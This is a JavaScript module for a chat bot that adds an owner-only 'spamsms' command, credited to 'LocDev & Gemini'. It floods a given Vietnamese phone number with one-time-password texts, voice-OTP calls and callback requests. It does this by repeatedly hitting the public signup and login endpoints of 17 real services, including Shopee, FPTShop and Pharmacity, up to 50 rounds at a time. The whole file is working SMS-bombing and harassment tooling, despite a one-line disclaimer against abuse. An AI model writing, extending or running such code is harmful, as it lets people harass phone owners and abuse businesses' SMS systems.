import axios from "axios";
import { log } from "../logger.js";

export const name = "spamsms";
export const version = "2.1.0";
export const credits = "LocDev & Gemini";
export const description = "Spam SMS/OTP đến số điện thoại qua nhiều dịch vụ (Nghiêm cấm lạm dụng phá hoại)";

// --- CÁC HÀM GỬI OTP NGON (ĐÃ TEST) ---
async function sendOTP_TV360(phone) { try { await axios.post('https://tv360.vn/public/v1/auth/get-otp-login', { msisdn: phone }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Vieon(phone) { try { await axios.post('https://api.vieon.vn/backend/user/v2/register', { username: phone, country_code: 'VN' }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Shopee(phone) { try { await axios.post('https://shopee.vn/api/v4/otp/get_settings_v2', { operation: 8, phone: phone }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Dominos(phone) { try { await axios.post('https://dominos.vn/api/v1/users/send-otp', { phone_number: phone, type: 0, is_register: true }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_ViettelPost(phone) { try { await axios.post('https://id.viettelpost.vn/Account/SendOTPByPhone', new URLSearchParams({ 'FormRegister.Phone': phone, 'FormRegister.FullName': 'Bot User', 'ConfirmOtpType': 'Register' }), { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Vato(phone) { try { await axios.post('https://api.vato.vn/api/authenticate/request_code', { phoneNumber: phone, deviceId: 'bot-device-id', use_for: 'LOGIN' }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Baemin(phone) { try { await axios.post('https://www.baemin.vn/api/auth/send-otp', { phone }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Sapo(phone) { try { await axios.post('https://www.sapo.vn/fnb/sendotp', new URLSearchParams({ phonenumber: phone }), { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Gumac(phone) { try { await axios.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', { phone }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Ahamove(phone) { try { await axios.post('https://api.ahamove.com/api/v3/public/user/login', { mobile: phone, country_code: 'VN', firebase_sms_auth: true }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_NhaThuocLongChau(phone) { try { await axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', { phoneNumber: phone, otpType: 0, fromSys: 'WEBKHLC' }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_FPTShop(phone) { try { await axios.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', { phoneNumber: phone, otpType: '0', fromSys: 'WEBKHICT' }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Pharmacity(phone) { try { await axios.post('https://api-gateway.pharmacity.vn/customers/register/otp', { phone, referral: '' }, { timeout: 5000 }); } catch (e) { } }
async function sendOTP_Medpro(phone) { try { await axios.post('https://api-v2.medpro.com.vn/user/phone-register', { phone, fullname: 'Bot User', type: 'password' }, { timeout: 5000 }); } catch (e) {} }

// --- CÁC HÀM GỌI LẠI (CALL SPAM / VOICE OTP) ---
async function sendCall_Ocha(phone) { 
    try { 
        await axios.post('https://ocha.vn/api/merchant/callback_request', { phone_number: phone, source: 'web' }, { timeout: 5000 }); 
    } catch (e) {} 
}
async function sendVoiceOTP_Vieon(phone) { 
    try { 
        await axios.post('https://api.vieon.vn/backend/user/v2/voice-otp', { username: phone, country_code: 'VN' }, { timeout: 5000 }); 
    } catch (e) {} 
}
async function sendCall_AIA(phone) {
    try {
        await axios.post('https://www.aia.com.vn/vi/yeu-cau-tu-van.html', new URLSearchParams({ 
            'phone': phone, 'name': 'Bot User', 'city': 'Hồ Chí Minh', 'agreed': 'true' 
        }), { timeout: 5000 });
    } catch (e) {}
}

const allOTPFunctions = [
    sendOTP_TV360, sendOTP_Vieon, sendOTP_Shopee, sendOTP_Dominos, 
    sendOTP_ViettelPost, sendOTP_Vato, sendOTP_Baemin, sendOTP_Sapo,
    sendOTP_Gumac, sendOTP_Ahamove, sendOTP_NhaThuocLongChau, sendOTP_FPTShop,
    sendOTP_Pharmacity, sendOTP_Medpro,
    // Call functions
    sendCall_Ocha, sendVoiceOTP_Vieon, sendCall_AIA
];



export const commands = {
    spamsms: async (ctx) => {
        const { api, threadId, threadType, args, senderId, senderName, isOwner } = ctx;

        if (!isOwner) {
            return api.sendMessage({ msg: "➜  Quyền hạn không đủ." }, threadId, threadType);
        }

        const phone = args[0];
        const times = parseInt(args[1]) || 1;

        if (!phone || !/^\d{10}$/.test(phone)) {
            return api.sendMessage({ msg: `Vui lòng nhập số điện thoại hợp lệ (10 chữ số).\n➜ Ví dụ: -spamsms 0987654321 5` }, threadId, threadType);
        }

        if (times > 50) {
            return api.sendMessage({ msg: `Số lần tối đa là 50 để tránh lỗi bot.` }, threadId, threadType);
        }

        api.sendMessage({ msg: `Đang bắt đầu spam tới ${phone} | ${times} lần lặp (${allOTPFunctions.length * times} SMS)...` }, threadId, threadType);

        for (let i = 0; i < times; i++) {
            await Promise.allSettled(allOTPFunctions.map(fn => fn(phone)));
            if (i < times - 1) await new Promise(res => setTimeout(res, 2000)); // Nghỉ 2s giữa mỗi đợt
        }

        return api.sendMessage({ msg: `Đã hoàn thành spam tới ${phone}!` }, threadId, threadType);
    }
};
